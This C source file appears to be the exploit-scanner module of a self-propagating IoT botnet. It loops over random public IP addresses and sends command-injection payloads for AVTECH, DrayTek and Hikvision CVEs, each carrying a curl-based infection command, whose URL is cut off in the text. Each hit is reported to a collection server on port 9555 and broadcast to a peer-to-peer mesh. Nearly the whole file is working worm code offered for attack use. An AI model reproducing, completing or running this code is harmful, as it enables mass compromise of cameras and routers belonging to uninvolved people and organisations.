#ifdef SELFREP
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include "includes.h"
#include "cve_exploits.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "fuzzer.h"
#include "p2p_mesh.h"
int cve_exploits_scanner_pid = 0;
int cve_ranges[] = {185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220};
static void log_event(const char *scanner, const char *event, ipv4_t ip, uint16_t port, const char *details)
{
    FILE *f = fopen("logs.txt", "a");
    if(!f) return;
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    char time_str[64];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm);
    fprintf(f, "[%s] [%s] %s %d.%d.%d.%d:%d %s\n", 
            time_str, scanner, event,
            (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff, 
            port, details ? details : "");
    fclose(f);
}
static void cve_report(ipv4_t addr, uint16_t port, const char *user, const char *pass)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in cb;
    cb.sin_family = AF_INET;
    cb.sin_addr.s_addr = SCANIP;
    cb.sin_port = htons(9555);
    if (connect(fd, (struct sockaddr *)&cb, sizeof(cb)) == -1) {
        close(fd);
        return;
    }
    uint8_t zero = 0;
    uint16_t port_net = htons(port);
    send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, &addr, sizeof(ipv4_t), MSG_NOSIGNAL);
    send(fd, &port_net, sizeof(uint16_t), MSG_NOSIGNAL);
    uint8_t ulen = (uint8_t)strlen(user);
    uint8_t plen = (uint8_t)strlen(pass);
    if (ulen == 0) ulen = 1;
    if (plen == 0) plen = 1;
    send(fd, &ulen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, user, ulen, MSG_NOSIGNAL);
    send(fd, &plen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, pass, plen, MSG_NOSIGNAL);
    close(fd);
}
static ipv4_t get_random_cve_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
    do
    {
        tmp = rand_next();
        o1 = cve_ranges[tmp % (sizeof(cve_ranges)/sizeof(cve_ranges[0]))];
        o2 = rand_next() & 0xff;
        o3 = rand_next() & 0xff;
        o4 = rand_next() & 0xff;
        tmp = INET_ADDR(o1, o2, o3, o4);
        if(o1 == 0 || o1 == 10 || o1 == 127 || (o1 == 172 && o2 >= 16 && o2 <= 31) || (o1 == 192 && o2 == 168) || o1 >= 224)
            continue;
    } while(tmp == LOCAL_ADDR || tmp == 0 || tmp == 0xffffffff);
    return tmp;
}
static int cve_2024_7029_avtech(ipv4_t ip)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0) return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;
    addr.sin_port = htons(80);
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        if(errno != EINPROGRESS)
        {
            close(fd);
            return 0;
        }
    }
    fd_set write_fds;
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    if(select(fd + 1, NULL, &write_fds, NULL, &tv) <= 0)
    {
        close(fd);
        return 0;
    }
    const char *infection_cmd = "curl -s https:
    char exploit[2048];
    int len = snprintf(exploit, sizeof(exploit),
        "POST /cgi-bin/user/Config.cgi HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n"
        "\r\n"
        "action=set&reboot=;%s;",
        (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff,
        (int)(strlen(infection_cmd) + 20),
        infection_cmd);
    send(fd, exploit, len, MSG_NOSIGNAL);
    close(fd);
    return 1;
}
static int cve_2024_41592_draytek(ipv4_t ip)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0) return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;
    addr.sin_port = htons(80);
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        if(errno != EINPROGRESS)
        {
            close(fd);
            return 0;
        }
    }
    fd_set write_fds;
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    if(select(fd + 1, NULL, &write_fds, NULL, &tv) <= 0)
    {
        close(fd);
        return 0;
    }
    const char *infection_cmd = "curl -s https:
    char overflow[2048];
    memset(overflow, 'A', 1024);
    snprintf(overflow + 1024, sizeof(overflow) - 1024, ";%s;", infection_cmd);
    char req[4096];
    int len = snprintf(req, sizeof(req),
        "GET /cgi-bin/mainfunction.cgi?action=GetCGI&%s HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d\r\n"
        "\r\n",
        overflow,
        (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff);
    send(fd, req, len, MSG_NOSIGNAL);
    close(fd);
    return 1;
}
static int cve_2024_41585_draytek(ipv4_t ip)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0) return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;
    addr.sin_port = htons(80);
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        if(errno != EINPROGRESS)
        {
            close(fd);
            return 0;
        }
    }
    fd_set write_fds;
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    if(select(fd + 1, NULL, &write_fds, NULL, &tv) <= 0)
    {
        close(fd);
        return 0;
    }
    const char *infection_cmd = "curl -s https:
    char exploit[2048];
    int len = snprintf(exploit, sizeof(exploit),
        "POST /cgi-bin/recvCmd.cgi HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n"
        "\r\n"
        "cmd=;%s;",
        (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff,
        (int)(strlen(infection_cmd) + 10),
        infection_cmd);
    send(fd, exploit, len, MSG_NOSIGNAL);
    close(fd);
    return 1;
}
static int cve_2021_36260_hikvision(ipv4_t ip)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0) return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;
    addr.sin_port = htons(80);
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        if(errno != EINPROGRESS)
        {
            close(fd);
            return 0;
        }
    }
    fd_set write_fds;
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    if(select(fd + 1, NULL, &write_fds, NULL, &tv) <= 0)
    {
        close(fd);
        return 0;
    }
    const char *infection_cmd = "curl -s https:
    char exploit[2048];
    int len = snprintf(exploit, sizeof(exploit),
        "PUT /SDK/webLanguage HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n"
        "\r\n"
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
        "<Language version=\"1.0\" xmlns=\"http:
        "<languageType>;%s;</languageType>\r\n"
        "</Language>",
        (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff,
        (int)(strlen(infection_cmd) + 200),
        infection_cmd);
    send(fd, exploit, len, MSG_NOSIGNAL);
    close(fd);
    return 1;
}
void cve_exploits_scanner(void)
{
    cve_exploits_scanner_pid = fork();
    if(cve_exploits_scanner_pid > 0 || cve_exploits_scanner_pid == -1)
        return;
    LOCAL_ADDR = util_local_addr();
    rand_init();
    while(TRUE)
    {
        ipv4_t target_ip = get_random_cve_ip();
        if(cve_2024_7029_avtech(target_ip))
        {
            log_event("CVE-2024-7029", "Exploited", target_ip, 80, "AVTECH");
            cve_report(target_ip, 80, "admin", "admin");
            zeroday_scanner_start(target_ip, 80, FUZZ_TYPE_HTTP);
            struct target_info info;
            info.target_ip = target_ip;
            info.target_port = 80;
            info.protocol = FUZZ_TYPE_HTTP;
            info.vulnerability_type = 1; 
            info.exploit_size = 0;
            info.success_rate = 100;
            info.last_tested = time(NULL);
            p2p_mesh_broadcast_target_info(&info);
        }
        usleep(rand_next() % 500000);
        if(cve_2024_41592_draytek(target_ip))
        {
            log_event("CVE-2024-41592", "Exploited", target_ip, 80, "DrayTek");
            cve_report(target_ip, 80, "admin", "admin");
        }
        usleep(rand_next() % 500000);
        if(cve_2024_41585_draytek(target_ip))
        {
            log_event("CVE-2024-41585", "Exploited", target_ip, 80, "DrayTek");
            cve_report(target_ip, 80, "admin", "admin");
        }
        usleep(rand_next() % 500000);
        if(cve_2021_36260_hikvision(target_ip))
        {
            log_event("CVE-2021-36260", "Exploited", target_ip, 80, "Hikvision");
            cve_report(target_ip, 80, "admin", "admin");
        }
        usleep(rand_next() % 1000000 + 500000);
    }
    exit(0);
}
void cve_exploits_kill(void)
{
    if(cve_exploits_scanner_pid > 0)
    {
        kill(cve_exploits_scanner_pid, 9);
        cve_exploits_scanner_pid = 0;
    }
}
#endif
